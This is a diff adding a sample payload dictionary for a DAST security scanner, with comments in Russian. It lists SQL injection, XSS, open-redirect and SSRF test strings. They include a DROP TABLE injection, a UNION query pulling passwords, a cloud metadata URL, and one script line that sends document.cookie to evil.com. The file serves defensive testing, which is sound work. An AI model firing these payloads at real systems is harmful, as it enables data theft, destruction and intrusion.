@@ -1,0 +1,48 @@
+# Пример пользовательского словаря для DAST Analyzer
+# Формат: одна строка = один пейлоад
+# Комментарии начинаются с #
+# Этот файл можно загрузить через раздел "Словари" в приложении
+
+# ── SQL Injection ──────────────────────────────────────────────────────────────
+' OR 'x'='x
+' OR 1=1 LIMIT 1--
+1; DROP TABLE users--
+1' AND SLEEP(3)--
+' UNION SELECT username,password FROM users--
+" OR ""="
+') OR 1=1--
+1 OR 1=1
+' AND 1=1--
+' AND 1=2--
+
+# ── XSS ───────────────────────────────────────────────────────────────────────
+<script>alert('XSS')</script>
+<ScRiPt>alert(1)</ScRiPt>
+<img src="javascript:alert(1)">
+<iframe src="javascript:alert(1)"></iframe>
+{{7*7}}
+${7*7}
+<input autofocus onfocus=alert(1)>
+"><script>fetch('https://evil.com?c='+document.cookie)</script>
+<svg><animate onbegin=alert(1) attributeName=x></svg>
+';alert(1)//
+
+# ── Open Redirect ─────────────────────────────────────────────────────────────
+//evil.com
+https://evil.com
+/\evil.com
+https://evil.com%2F@trusted.com
+//evil.com/%2F..
+https://trusted.com.evil.com
+/%09/evil.com
+/https://evil.com
+
+# ── SSRF ──────────────────────────────────────────────────────────────────────
+http://localhost
+http://127.0.0.1
+http://169.254.169.254/latest/meta-data/
+http://[::1]
+http://0.0.0.0
+http://127.0.0.1:8080
+http://internal.service
+dict://localhost:11211/stat
